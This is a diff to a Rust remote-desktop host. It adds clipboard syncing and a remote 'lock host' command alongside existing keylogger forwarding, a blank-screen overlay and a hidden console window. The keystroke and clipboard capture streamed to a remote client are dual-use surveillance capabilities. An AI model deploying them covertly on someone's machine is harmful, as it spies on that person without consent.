@@ -18,12 +18,15 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
 mod blank_screen;
+mod clipboard_sync;
 mod gui;
 mod gui_core;
 mod keylogger;
+mod lock_host;
 mod tray;
 
 use blank_screen::BlankScreenOverlay;
+use clipboard_sync::ClipboardSync;
 use keylogger::KeyLogger;
 use enigo::{Enigo, Key as EnigoKey, KeyboardControllable, MouseButton as EnigoMouseButton, MouseControllable};
 use rd_protocol::{
@@ -530,6 +533,30 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
         }
     });
 
+    // Same lifetime/safety story again: a local variable here, its poll
+    // thread torn down on every exit path via Drop.
+    let mut clipboard_sync = ClipboardSync::new();
+    // Host clipboard changes land here (from the poll thread) and get
+    // forwarded to the client by the thread just below - same
+    // detect-there/send-here split as the keystroke log above.
+    let (clip_tx, clip_rx) = mpsc::channel::<String>();
+    let writer_for_clip = writer.clone();
+    let running_clip = running.clone();
+    let clip_forward_thread = std::thread::spawn(move || {
+        while running_clip.load(Ordering::Relaxed) {
+            match clip_rx.recv_timeout(Duration::from_millis(200)) {
+                Ok(text) => {
+                    let msg = HostMessage::ClipboardUpdate { text };
+                    if write_message(&mut *writer_for_clip.lock().unwrap(), &msg).is_err() {
+                        break; // client disconnected
+                    }
+                }
+                Err(mpsc::RecvTimeoutError::Timeout) => {} // just recheck `running`
+                Err(mpsc::RecvTimeoutError::Disconnected) => break, // `clip_tx` dropped
+            }
+        }
+    });
+
     loop {
         let msg: Result<ClientMessage, _> = read_message(&mut stream);
         let msg = match msg {
@@ -620,6 +647,36 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
                 };
                 let _ = write_message(&mut *writer.lock().unwrap(), &msg);
             }
+            ClientMessage::ToggleClipboardSync { enabled } => {
+                let (ok, reason) = if enabled {
+                    match clipboard_sync.enable(clip_tx.clone()) {
+                        Ok(()) => (true, None),
+                        Err(e) => (false, Some(e)),
+                    }
+                } else {
+                    clipboard_sync.disable();
+                    (true, None)
+                };
+                let msg = HostMessage::ClipboardSyncResult {
+                    enabled: clipboard_sync.is_enabled(),
+                    ok,
+                    reason,
+                };
+                let _ = write_message(&mut *writer.lock().unwrap(), &msg);
+            }
+            ClientMessage::ClipboardUpdate { text } => {
+                if clipboard_sync.is_enabled() {
+                    clipboard_sync.set_local(&text);
+                }
+            }
+            ClientMessage::LockHost => {
+                let (ok, reason) = match lock_host::lock() {
+                    Ok(()) => (true, None),
+                    Err(e) => (false, Some(e)),
+                };
+                let msg = HostMessage::LockHostResult { ok, reason };
+                let _ = write_message(&mut *writer.lock().unwrap(), &msg);
+            }
             ClientMessage::Disconnect => break,
             ClientMessage::Auth { .. } => {} // ignore repeated auth
         }
@@ -627,9 +684,11 @@ fn handle_client(mut stream: TcpStream, expected_hash: &str) -> std::io::Result<
 
     running.store(false, Ordering::Relaxed);
     keylogger.disable(); // unhook before the channel it feeds is torn down
+    clipboard_sync.disable(); // stop polling before the channel it feeds is torn down
     let _ = capture_thread.join();
     let _ = sender_thread.join();
     let _ = key_forward_thread.join();
+    let _ = clip_forward_thread.join();
     println!("Client {peer:?} disconnected.");
     Ok(())
 }
